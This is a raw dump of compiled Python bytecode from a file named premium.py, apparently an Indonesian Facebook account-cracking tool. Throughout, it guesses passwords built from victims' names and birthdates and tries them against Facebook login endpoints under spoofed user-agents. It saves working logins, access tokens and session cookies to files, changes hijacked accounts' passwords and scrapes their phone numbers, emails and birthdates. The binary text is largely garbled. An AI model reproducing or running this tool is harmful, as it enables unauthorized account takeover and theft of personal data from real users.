+pencarian_pro�s�0  )!!0  4"7Q3"7k333#3c  
+Csitjj�}t|j�dt|j�dt|j�}tdtdtdtdj  ||�}t
+t�dkr�|d}t|||�n|GH|j
+dd�}td  d
+���}td  d�j�}||kr-|j
+||�j
+||�}td  d��}|j|�WdQXn%|jd
+|d|d|d�WdQXtj|�dS(Nt-s
+{tChekt}s {:<15}[92;1m | [90;1m{}   is>>>RDshasil_cp.txtR"RRt[s]==>s==>|==>s
+(tdatetimetnowRJtyeartmonthtdayR RRRaR%tsesitcek_devRIR#RnR$thasil_cpR((  teml_devR�twaktwaktuRZthasiltdiR�R�((s
+premium.pyt__cp__s 1.
++c
+
+Cs�yttjj�}t|j�dt|j�dt|j�}tdtdtdtdj  |||�}t
+t�dkr�|d}t|||�n|GH|j
+dd�}td  d
+���}td  d�j�}||kr3|j
+||�j
+||�}td  d��}  |  j|�WdQXn-|jd
+|d|d|d|d�WdQXtj|�WnnXdS(NR9s
+{R:R;s0 {:<15}[92;1m | [96;1m{}[92;1m | [97;1m{}   is>>>RDshasil_cp.txtR"RRR<s]==>s==>|==>s
+(R=R>RJR?R@RAR RRRaR%RBRCRIR#RnR$RDR((
+REtttlR�RFRGRZRHRIR�R�((s
+premium.pyt
+__ttl__cp_s&11
+3s�[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]c  Csstd}tdjtt�ttt�tt��}d|Gtj  j
+�td7a|}td}dt|�kr�|d}|d}nx�|D]�}y�|j�}da
+tt�dkr�tjdddd  g�a
+nit
+d
+6ttjdd��d
+6ttjdd��d6ttjdd��d6dd6dd6dd6dd6}  tjdt|�dt|�dd|  �}
+d|
+jkr�d|
+jkr�|tkr�q=td td!td"td#j||�GHtd$d%��$}|jd&|d'|d(�WdQXtj|�|
+j�d)}td td*td"td+t|d(GHtd,d%��}
+|
+j|d(�WdQX|
+j�d-}Pn�d.|
+j�d/kr=|
+j�}|d0jd1�}tjd2|�d}t|�dkr|tkr  q:t |||�Pq=|tkr,q=t!||�PnWq�td8a|j"�}t#||�q�Xq�WdS(3Nisp>[92;1mCrack[96;1m->[97;1m{}[92;1m/[97;1m{}[96;1m|[92;1mLive[96;1m/[93;1mCek:[92;1m{}[96;1m/[93;1m{}s
+iis�[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]s�[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]s�[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]s�Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]s
+user-agentg�sAg8�|Asx-fb-connection-bandwidthi Ni@�sx-fb-sim-hnisx-fb-net-hnit  EXCELLENTsx-fb-connection-qualitys!cell.CTRadioAccessTechnologyHSDPAsx-fb-connection-types!application/x-www-form-urlencodedscontent-typetLigersx-fb-http-engines?https://b-api.facebook.com/method/auth.login?format=json&email=s
+&password=s�&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=trueR�tsession_keytEAAAs
+{tLiveR;s3 {:<15}[96;1m | [97;1m{} [96;1mLogin Di FB Lite shasil_ok.txtR"s[Live] s | s
+taccess_tokentTokns AccessToken: sakun_tumbal.txttsession_cookiesswww.facebook.comt  error_msgt
+error_datasutf-8s$"uid":(.*),"show_native_checkpoints"($RFR"RaR%Rqtcount_thasil_okRDRrRsRtR�tlowert
+user_agentR'R�R�RJtrandintR_RoReRR R#R$R(RpRRR�R�RLRJRt
+crack_dev_api(tiqbal_tdev___R.R�RERRKtsan_R�R1tresponseRHRvttumbaltcokizRltftdev_san((s
+premium.pyR\5sv
+.
+
+
+
+
+
+  
+
+1-#
+-
+
+cCs�|}tdjtt�ttt�tt��Gtjj  �td7at
+d}dt|�kr||d}|d}nxs|D]k}y8|j�}d}dtkr�t
+}ndtkr�t}ntj���}|j|�j}  t|  d�}
+|
+jdd  d
+�}|d}tj�}
+tt�dkrMtdd
+�j�antjt�ai}i}x>|D]6}|}y |jd�||jd�<WqoqoXqoW|jit|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|�d6dd6dd6dd6dd6t d6t d 6t d!6it!d"6t!d#6t!d$6t d%6d&d'6t!d(6d)d*6d&d+6t!d,6t!d-6t!d.6d/d06t d16it!d"6t d#6t!d$6t d%6d&d'6t!d(6d)d*6d&d+6t!d,6t!d-6t!d.6d26d36t|�d46d5jttj"d6d7��t|��d86d9d6d:d;6d:d<6d=d>6d:d?6d9d@6�|j#ji
+tdA6t$|dB6dCdD6dEdF6dGdH6dIdJ6dKdL6t|d�dM6ttj"dNdO��dP6dQdR6�it|�d46d5jttj"d6d7��t|��d86}|j%t$|dS|dTt �j&}|j'�}t|j'��dkr�|j%t$|dS|dTt �j&}ndU|kr0|tkr�q�tdVt(dWtdXt)dYj||�GHtdZd[��$}|j*d\|d]|d^�WdQXtj+|�Pn�d_|kr�|j'�d_j,d`�daj-dbd:�}t|�dkr�|tkr�q�t.|||�Pq�|tkr�q�t/||�PnWdQXWq�td8a|j,�}t0||�q�Xq�WdS(cNsq
+>[92;1mCrack[96;1m->[97;1m{}[92;1m/[97;1m{}[96;1m|[92;1mLive[96;1m/[93;1mCek:[92;1m{}[96;1m/[93;1m{}iiishttps://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdrRshtml.parserRzR\R�R{s
+ua_dev.txtRR|R>R�tm_tstjazoesttlit
+try_numbertunrecognized_triestbi_xrwhtprefill_contact_pointtprovided_or_soft_matchedtprefill_sourcet
+contact_pointtprefill_typetbrowser_dropdowntfirst_prefill_sourcetfirst_prefill_typethad_cp_prefilledthad_password_prefilledt
+is_smart_lockthwcthwcrthas_dntthas_standalones%function toString() { [native code] }twnd_toStr_toStrthasPerms"function query() { [native code] }tpermission_query_toStringt"permission_query_toString_toStringthas_seWothas_meDet  has_credss.function get contentWindow() { [native code] }tiframePrototremapt
+iframeDatatbi_wvdpR�s#PWD_BROWSER:0:{}:{}iʚ;l�c(  tencpassR�RDt__dynt__csrtet__reqt__at__users
+user-agentR�sm.facebook.comR�s*/*R�s?1ssec-ch-ua-mobilesgzip, deflate, brsaccept-encodingsid,en-US;q=0.9,en;q=0.8saccept-languagesx-fb-lsdi�i�scontent-lengths!application/x-www-form-urlencodedscontent-typeRZR�R�s
+{RQR;s {:<15}[96;1m | [97;1m{}shasil_ok.txtR"s[Live] s | s
+R�t%it3A(1R"RaR%RqRWRXRDRrRsRtR�RYt
+log_ml_devR7t
+log_ff_devR6R_R`RoRcRRdR�R'R#RnRZR�R�R*R�RJR�R�R[R�R�RbRyR�RR R$R(RRIRLRJt  crack_dev(R]R^RER.RKR_R�R�R�R�R�R�R�RGRitpay_devRPR�tpay_R�R�RHRd((s
+premium.pyR��s�,
+
+
+
+
+
+    
+
+   
+�
++>"%-#
+)
+
+
+cCsEy|}tdjtt�ttt�tt��Gtjj  �td7at
+d}dt|�kr|d}|d}nx�|D]�}|j�}d}tj
+��c}dtkr�d}ndtkr�d}n|j|�j}  t|  d  �}
+|
+jd
+dd�}|d
+}tj�}
+i}i}x>|D]6}|}y |jd�||jd�<Wq6q6Xq6Wit|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|�d6dd6dd6dd6dd6td6td 6td!6itd"6td#6td$6td%6d&d'6td(6d)d*6d&d+6td,6td-6td.6d/d06td16itd"6td#6td$6td%6d&d'6td(6d)d*6d&d+6td,6td-6td.6d26d36t|�d46d5jttjd6d7��t|��d86d9d6d:d;6d:d<6d=d>6d:d?6d9d@6}dtks[dtkr<i}x>|D]6}|}y |jd�||jd�<WqhqhXqhWi  t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|d�d6t|�d46t|�dA6t|d�d6}ndB}dC}dtkrcdD}dE}ndtkr~dF}dG}ntjt�ai|dH6tdI6dJdK6dLdM6ddN6dOdP6ttjdQdR��dS6dTdU6|dV6|dW6dXdY6dZd[6d\d]6d^d_6}tt�dkr�td`da�j�ai|dH6tdI6dJdK6dLdM6ddN6dOdP6ttjdQdR��dS6dTdU6|dV6|dW6dXdY6dZd[6d\d]6d^d_6}n|j ||db|dc|�}|j!}|j"�}dd|ks�de|j#kr||tkr  q  tdft$dgtdht%dij||�GHtdjdk��$}|j&dl|dm|dn�WdQXtj'|�Pn�do|kr|j"�doj(dp�dqj)drd:�}t|�dkr�|tkr�qt*|||�Pq  |tkr�q  t+||�Pnw�WdQXq�WWn*td8a|j(�}t,||�nXdS(sNsq
+>[92;1mCrack[96;1m->[97;1m{}[92;1m/[97;1m{}[96;1m|[92;1mLive[96;1m/[93;1mCek:[92;1m{}[96;1m/[93;1m{}iiis(https://m.facebook.com/login/?ref=dbl&flRs-https://mbasic.facebook.com/login/?ref=dbl&fls#https://free.facebook.com/login.phpshtml.parserRzR\R�R{R|R>R�ReRfRgRhRiRjRkRlRmRnRoRpRqRrRsRtRuRvRwRxRys%function toString() { [native code] }RzR{s"function query() { [native code] }R|R}R~RR�s.function get contentWindow() { [native code] }R�R�R�R�R�s#PWD_BROWSER:0:{}:{}iʚ;l�c(  R�R�RDR�R�R�R�R�R�R�shttps://m.facebook.comsm.facebook.comshttps://mbasic.facebook.comsmbasic.facebook.comshttps://free.facebook.comsfree.facebook.comR�s
+user-agents�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9R�sgzip, deflate, brsaccept-encodingsaccept-languages  max-age=0s
+cache-controlidi�scontent-lengths!application/x-www-form-urlencodedscontent-typeRR�s?0ssec-ch-ua-mobiletdocumentssec-fetch-desttnavigatessec-fetch-modessame-originssec-fetch-sites
+ua_dev.txtRRZR�R�tcheckpointSecondaryButtons
+{RQR;s {:<15}[96;1m | [97;1m{}shasil_ok.txtR"s[Live] s | s
+R�R�iR�(-R"RaR%RqRWRXRDRrRsRtR�RYR_R`tlog_mbasic_devtlog_free_devRoRcRRdR�RJR�R�R�R[R�R*RZR'R#RnRbRyR�ReRR R$R(RRIRLRJtcrack_mobile(R]tdev__RER.RKtsan__R�RhR�R�R�RzR�twkt_devRiR�RPR�t  url_post_thostt
+header_mobileR�tlogR�RHRd((s
+premium.pyR��s,
+
+
+
+
+
+    
+
+ 
+�
++
+
+ 
+
+    
+
+  -#
+)
+
+cCsUtjd�x�tr�tGHttdtdtdtdtdtdtd�}|d  kss|d
+kr�t  jd�Pqd|ks�d
+|krda
+PqqWtt  �dkrQx�trMtGHtdtdtdtdtdGHttdtdtdtdtdtd�a
+tt
+�dkrItdGHq�Pq�WndS(NtDevs [R�Rs Ubah Sandi Akuns Tap Yess [y/n]s: RFtYRtntNRDit@s   Contoh: tanjings% Masukkan sandi untuk ubah sandi Akunis Minimal 6 Karakter..(
+ttap_yesR(R�RR!R RR"Rtpw_taptpw_newR%RK(tpil_pw((s
+premium.pytseting_pw_tap_yes�s&
+  @
+  )8cCsYtdtdtdtdtdGHttdtdtdtdtd  td
+�}d}d}x�trtdtdtdtd
+tdGHttdtdtdtdtd
+�}t|�dkrp|jd�}x|D]}tj  |�q�WPqpqpWx�tr�t
+GHtdtdtdtdGHtdtdtdtGxtD]}dt|GqhWdGHtdtdtdtGxtD]}tdt|Gq�WdGHtdtdtdtGxtD]}tdt|Gq�WxtD]}tdt|Gq  WdGHt
+GHttdtdtdtdtd
+�}|dkrztj  d�Pq|dkr�tj  d�Pq|dkr�tj  d�Pq|dkrtj  d�PqqWtt�dkryx�trut
+GHttdtdtdtdt
+dtd
+�}d|ksEd|krVtj  d �Pq�d!|ksnd"|kr�Pq�q�Wnx�trt
+GHttdtdtdtd#td$t
+dtd
+�}d|ks�d|kr�tj  d �Pq|d!|ksd"|kr|Pq|q|Wtt�dkr�x�tr�t
+GHttdtdtdtd%t
+d&td'td
+�}|dks�|dkr�tj  d(�Pq%d!|ks�d"|kr%d)aPq%q%Wntt�dkrix�tret
+GHtdtdtdtd
+td*GHttdtdtdtd+t
+d&td
+�att�d,kratd-GHq�Pq�Wnd|kr�|jd�}|d|}  nFd.|kr�|jd.�}|d.|}  n|j�}|d|}  xz|D]r}t|�d,kr
+tj  |�q�t|�d/ks@t|�d0ks@t|�d1kr�tj  |d2�q�q�Wtt�dkrUtdtd3tdtd4t|  GHttdtdtdtd5t
+dtd
+�}
+d|
+ks�d|
+krtj  d(�tdtd3tdtd6t
+d7GHqUtj  d(�tdtd3tdtd8td9GHndS(:Ns
+ [R�Rs Contoh Sandi Manual: sanjing,kintil,gantengs [R�s Input Sandi Manual?s
+ENTER>Skips: sname123,name12345sname123 name12345s   Contoh: s123,1234,12345s  Tambahkan Angka Dibelakang Namait,R
+s FirstName+LastName FullNameRt  FirstNametFullNameR
+sFirstName+LastNamesFirstName+LastName FullNameRs Pilih Kombinasi Sandis Tambahkan Sandi TTL?s[y/n]RFR�R�R�R�s Munculkan sOPSI SESI ?s Ubah Sandi Akuns Tap Yess [y/n]RRDR�s$Masukkan Sandi untuk ubah Sandi Akunis Minimal 6 Karakter..REiiit123Rs Jika diGabung: s# Gabungkan Sandi Manual dan Bawaan?s& Menggabungkan Sandi Manual dan Bawaans >_<s( Tidak Menggabungkan Dengan Sandi Bawaans X(R RRR!R�R�R%Rt
+angka_namaR(RtpilihR�R"tsan_ttlRBR�R�RKt
+san_manualtsandi_gabungt
+gak_gabung(tsantsandi_bawaan_komatsandi_bawaan_spasitangkatangka_RPR+R�R_ttampaktsandi((s
+premium.pyR�s�)8  )0
+  !
+
+
+
+0
+
+
+
+  8
+  @
+  @
+  )8
+6)8
+,
+)c
+Cs
+tdd���  }x�  tD]�  }y�  g}|j�d}|j�}td}dtkrct}ndtkrft|d�dkr�t|�dkrOdtkr|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqqXnd
+tkr�xNt
+D]F}t|�dkrOt|d�dkrOq|j  |d|�qW|j  |dd  |d�y%|j  |d|d|d�Wq�q�XndtkrYx+t
+D]#}|j  |d|d|�q�W|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqYqYXndtkr�xNt
+D]F}t|�dkr�t|d�dkr�ql|j  |d|�qlWx+t
+D]#}|j  |d|d|�q�W|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqLqLXq�qcxt
+D]F}t|�dkr�t|d�dkr�qV|j  |d|�qVWqdt|�dkr�x+t
+D]#}|j  |d|d|�q�W|j  |d|d�qdxbt
+D]Y}t|�dkrB|j  |d|d||�q|j  |d|d|�qWn�t|d�dkr�t|�dkrFdtkr|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqqXnd
+tkr�xNt
+D]F}t|�dkrFt|d�dkrFq|j  |d|�qW|j  |dd  |d�y%|j  |d|d|d�Wq�q�XndtkrPx+t
+D]#}|j  |d|d|�q�W|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqPqPXndtkr�xNt
+D]F}t|�dkr�t|d�dkr�qc|j  |d|�qcWx+t
+D]#}|j  |d|d|�q�W|j  |d|d�|j  |dd  |d�y%|j  |d|d|d�WqCqCXq�qZxt
+D]F}t|�dkr~t|d�dkr~qM|j  |d|�qMWn�t|�dkr�x+t
+D]#}|j  |d|d|�q�W|j  |d|d�ndxat
+D]Y}t|�dkr9|j  |d|d||�q�|j  |d|d|�q�W|t}td}d
+tkr�d|kr�g}|djd�}t|d�}  |  j
+dd�}
+|j  |
+�t|d�dkr�q�||}q�ndtkrJ  d|kr4  |jd�}|jt||�q�  |jt||�n�dtkr�  d|kr�  |jd�}|jt||�q�  |jt||�nXdtkr�  d|kr�  |jd�}|jt||�q�  |jt||�ndGHWqqXqWWdQXdS(NRiiRiiR
+iRERR
+RR�s>>>t/RDis Gak Ada Pilihan....(RRqRR�R�R�R�R%R�R(R�R�RJRIt  instagramtsubmitR�tb_apiR\tmobile_crackR�(tc_devtdata_tpast_id_dev_R7RRPRcttl_devttlttl_tid_dev_gans((s
+premium.pytcrack5s&
+
+  %
+(%
+!%
+(
+!%
+
+(
+!
+$$%
+(%
+!%
+(
+!%
+
+(
+!
+$!
+
+
+c(Csyg}g}t|jd�}|jd�}  |  d}
+|jddidd6�d}|jddid  d6�d}i}
+x0|  D](}|}|jd�|
+|jd�<q�W|
+ji|d  6|d6|d
+6�|jd|
+d|
+�}y`|jd
+�}d|jkr�y�t|jd�jd�}|d}i}
+x0|D](}|}|jd�|
+|jd�<qDW|jd|d|
+�|jd
+�}Wq�q�Xnt|jd�}|jd�j}|jdd�jdd�}tdt  dtdt
+|d}dt|�krCtdtdtdt
+d}ny�t
+jt
+d�}d}|j|�j}t|d�}|jddd�}|jddd�}x�|jd d!td"d#�D]�}|j}|dkr�d$|kr$|jtd%td&tdt
+|d't  |�nd(|ksHd)|ksHd*|kr�|jtd%td&tdt
+|d+t  |�q�q�q�W|jd d!td"d#�j}|jtd%td&tdt
+d,t|�Wnd-g}nXy/d.} d/d0g}!|jtd%t  d1tdt
+d2�x�|!D]�}"|j|"�}#t|#jd�}|jdd3d4�}$x�|$jd�D]�}y�|jd5�j}%| d6kr�|jt
+d7tt| �d8t|%�n+|jt
+d9tt| �d8t|%�| d.7} Wq{q{Xq{Wq/WWnnXt|�d.krM|jd:td;�nWnd}d}nX|j||�}&tt�d<kr�yMtd=t  d>tdt
+d?j||�}|j||�}&tt�d<kr9td=t
+d@tdt
+dAtdBtdtdCtdDt
+dE|&d-|tGHnOtd=tdCtdFt
+dE|&d-|dj|�dj|�d-tGHd|kr�d}ntdGdH�� }'|'j|&t
+|d-�WdQXgaWq
+q
+Xn+y!tt�d<krStd=t
+d@tdt
+dAtdItdtdCtdJt
+dE|&d-|tGHnOtd=tdCtdKt
+dE|&d-|dj|�dj|�d-tGHd|kr�d}ntdGdH�� }'|'j|&t
+|d-�WdQXtj|&�td<=gaWnnXWnnXdS(LNshtml.parserRzR{R�R�ssubmit[Next]R>R|tnhtpassword_newshttps://mbasic.facebook.comRZs'https://mbasic.facebook.com/me/friends?szero/optin/legal/Rt(s[92;1m([97;1mt)s[92;1m)t{tTems} RDtNulR;s# Tidak Bisa Menampilkan Jmlah Temans.https://mbasic.facebook.com/profile.php?v=infoR-R\s
+basic-infoscontact-infottdRtvalignttopR9s
+{tinfs No HP: s
+@gmail.coms
+@yahoo.coms
+@email.coms Email: s TTL__: s
+is<https://mbasic.facebook.com/settings/apps/tabbed/?tab=actives>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivetApks Aplikasi yang terkaittmethodRbR[is
+    |_REs
+    \_s
+      sTidak ada Aplikasi yg Terkait..is
+{tYess {:<15}[92;1m | [96;1m{}   tSucs Sukses Melewatis Sesi TTL >>> 
+s>/<s} Sukses Mengganti Sandi.. s>_< Log Di Mbasic 
+s} Sukses Mengganti Sandi,, shasil_ok.txtR"s
+ Sesi TTL   
+s} Sukses Mengganti Sandi--> s} Sukses Mengganti Sandi-- (RRcRdRoR�RbReRIR R"RRJRR�R�R�R(R%RKR�Rat
+tampil_ttltbatasR�R#R$RXRD((tpw_new_RZRER�trespon_2R�tinfotapk_devt  sop_dev_2Rzt
+url_post_2tsubmit_2tnh_2RiRPR�trespon_3trespon_4R�R�R�tjm_temant  jm_teman_tjumlah_temantinfo_turl_infot  data_infotsop_dev_infot  info_umumtinfo_kontaktdata_kontakt
+tanggal_lahirRRRht
+iqbal_datatform_tapkR�RH((s
+premium.pyt_iqbal_dev_pw_new_�s�
+  
+ "
+
+ &%"  8$?5    )
+.+.\O  
+\O  
+
+c*Csdy:|}|jdd�}d}tj��
+}|j|�j}t|d�}|jddd�}|d}  i}
+x0|D](}|}|jd  �|
+|jd
+�<q}Wi  t|
+d�d6t|
+d�d6t|
+d
+�d
+6t|
+d�d6t|
+d�d6t|
+d�d6t|�d6t|�d6t|
+d�d6}
+idd6dd6dd6dd6dd6dd6ttj  d d!��d"6d#d$6}|j
+d%|  d&|
+d'|�}g}d(|jkrlys
+t|jd�}|jd�}|d}  |jd)d*id+d
+6�d  }i}
+t}x0|D](}|}|jd  �|
+|jd
+�<q%W|
+j
+id,d-6|d+6�|j
+d%|  d&|
+�}|tkr�td.}nt}d/|jkr|jd0d1�jd2d3�jd4d5�}tjd6�t||||||�nd7|jkr3|jd0d8�jd2d3�jd4d5�}tjd6�|jd6�tt�d9krqt|jd�}|jd�}|d}|jd)d*id:d
+6�d  }|jd)d*id+d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q�W|
+j
+i|d+6|d:6�|j
+d%|d&|
+�}d/|jkr0t||||||�q0q3tt�d9kr�td;td<td=td>td?|td@GHq3tdAtd<td=t}|j�}|j|d9|�}td;td<td=td>td?|td@GHnt|jd�}|jdBd*idCd
+6�}dD}g}g} x�|jdE�D]�}|dFkr�|jd@tdGt|�tdH|j�n.|jd@tdIt|�tdH|j�t|d  �dJkr| jdJ�n|dD7}q�W|j�}!tt�d9kr�t| �dDkrjt|!�dKks�t| �dDkr�t|!�dLkr�|jd0d<�jd2d3�jd4d5�}t|!�dLkr�|!dM}"n|!dLjdN�}#|#dD}"|"jdO�}$g} t|jd�}|jd�}|d}  |jd)d*id+d
+6�d  }|jd)d*id-d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q�W|
+j
+i|d+6|d-6dJdC6�|j
+d%|  d&|
+�}%g}&dD}xtr�|dD7}|dPkrPnt|%jd�}'|jd�}|d}(|jd)d*id+d
+6�d  }|jd)d*id-d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q�Wt|&�dDkr  |
+j
+i|d+6|d-6t|$dD�dQ6t|$d9�dR6t|$dF�dS6�nTg}&|
+j
+i|d+6|d-6t|$d9�dQ6t|$dD�dR6t|$dF�dS6�|j
+d%|(d&|
+�})tjdT�tjd6�d7|)jkr�|jd6�t|)jd�}|jd�}|d}|jd)d*id:d
+6�d  }|jd)d*id+d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q9
+W|
+j
+i|d+6|d:6�|j
+d%|d&|
+�}d/|jkr�
+t||||||�Pq�t|jd�}|jd�}|d}  |jd)d*id+d
+6�d  }|jd)d*id-d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q=W|
+j
+i|d-6|d+6�|j
+d%|  d&|
+�}t||||||�Pq�d/|)jkr�t|||||)|�Pq�|&jd6�q�Wq�ntt�d9krgant|dj|�d@tGHWq3t|�dDkrXg}qi|d@tGHq3Xn�d7|jkr�
+|jd0dU�jd2d3�jd4d5�}tjd6�t|jd�}|jd�}|d}|jd)d*id:d
+6�d  }|jd)d*id+d
+6�d  }i}
+x0|D](}|}|jd  �|
+|jd
+�<q*
+W|
+j
+i|d+6|d:6�|j
+d%|d&|
+�}|tkr�
+td.}nt}t||||||�nndV|jkr�
+tdWt|d@tGHnCdX|jkrt dY|d@tGHnd|kr3|d@tGHnWdQXWn#d|kr`|d@tGHq`nXdS(ZNs>>>RDs!https://mbasic.facebook.com/loginshtml.parserRzR\R�R{R|R>R�RfReRgRhRiR�R�Rjs�Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]s
+user-agentsmbasic.facebook.comR�s  max-age=0s
+cache-controlR
+supgrade-insecure-requestssUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R�s
+gzip, deflatesaccept-encodingidi�scontent-lengths#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7saccept-languageshttps://mbasic.facebook.comRZR�R�R�R�R�t  Lanjutkanssubmit[Continue]t000R�R:tYes1s[90;1ms[92;1ms[93;1ms[96;1mRPR�R�issubmit[Yes]s
+{R�R;s Akun Tap Yes....s >_<  Log di Mbasic 
+s
+R�tselecttverification_methoditoptionis |_REs \_RiiiRKR�itbirthday_captcha_daytbirthday_captcha_monthtbirthday_captcha_yearRtYes3R�s
+ Akun Live...
+s!Anda menggunakan kata sandi lama.s
+ Menggunakan Sandi Lama.....
+(!RIR_R`RoRcRRdRJR�R[RbRyRFR�R�Retganti_pwR(R�R%R�RBR RRR�R"RR�R�R�R�RK(*RER�RZR�RhR�R�R�RzR�RiRPR�tpayloadsR1trespontbugRkR�tpaytrespon_R�R�R�R�R�tsuctdat_devtdatakut
+select_devRtoption_tsesi_ttltdatt  _ttl_dev_tttl_devR�t
+respon_ttltkondisitsop_dev2R�trespon_ttl_2((s
+premium.pyRCls�
+
+ 
+
+
+
+ 
+ 
+*
+*
+
+
+  
+ 881.H*
+
+
+  
+ "  
+
+  
+ QN
+
+
+
+  
+ 
+  
+ "*
+
+  
+ 
+
+c
+CsVy.tdtdtdtdGHtdd�j�}x'|D]}tj|jdd��q@Wtd  d
+���}x�tD]�}y�d|kr�|j  d�d}|j  d�d
+}|jdd�}|j
+t|||�n6|j  �d}|j  �d
+}|j
+t|||�Wq|q|Xq|WWdQXWn!tk
+rQt
+dGHt�nXdS(Ns
+ >>>s Tekans CTRL+Zs Untuk hentikan Proses
+shasil_cp.txtRs
+RDRis==>iiREs
+ Belum Ada Hasil Checkpoint..
+(R"RR R#RGthasil_cekpointR(RIRRR�RCRLRR)(t  hasil_cekRPRZR�R7R
+((s
+premium.pytauto_devgs*!
+
+
+  cCs�y�tGHtdtdtdtdtdGHtdtdtdtdtdtdtd  td
+tdGHtdtdtdtdtd
+tdtdtd
+tdGHtdtdtdtdtdtdtd
+tdGHtdtdtdtdtdGHtdtdtdtdtdtdtdGHtdtdtdtdtdGHtGHttdtd�}ytdd�j�Wn(tj  d�t
+j  d �t�nXtt
+�d!kr�|dkr�ttd"td#tdtd$td%t
+d&td'�}d(|ksdd)|kr�yBtdtd*tdtd+td,td-GHtj  d�Wq�d.GHq�Xq�tdtd*tdtd+td/GHntt
+�d!kr�|dkr�ttd"td#tdtd$td%t
+d&td'�}d(|ksZd)|kr�yWtd0d�j�}tdtd*tdtd+td,td-GHtj  d�Wq�tj  d�t�q�Xq�tdtd*tdtd+td1GHntd2GHtdtd*tdtd3GHtdtd4tdtd5GHtdtd4tdtd6GHtdtd4tdtd7GHd8GH|dkr�tj  d�t�n
+|dkr�tj  d�tj  d�t�n�|dkrtj  d�tj  d�t�n�|dkr6tj  d�t�n�|dkrYtj  d�t�ng|dkr�tj  d�tj  d�t�n7|dkr�tj  d�tj  d�t�nt�Wntk
+r�t�nXdS(9Ns [R
+Rs Cracks Login Instagram Lewat FacebookRs Login Free FireR�tFFR�s   Lewat FBR
+s Login Mobile LegendtMLBBRs Crack API facebooks
+fast Crackings>> Super ProRs Login Lewat facebook MobileRs Login Lewat facebooks Mbasics Pro..Rs Login Lewat facebook Frees +>>>REs
+ua_dev.txtRRR  is
+ [R�s Gunakan User-Agent Random?s[y/n]s
+ENTER>Skips: RFR�Rs Menggunakans User-Agent tRandoms
+ Error
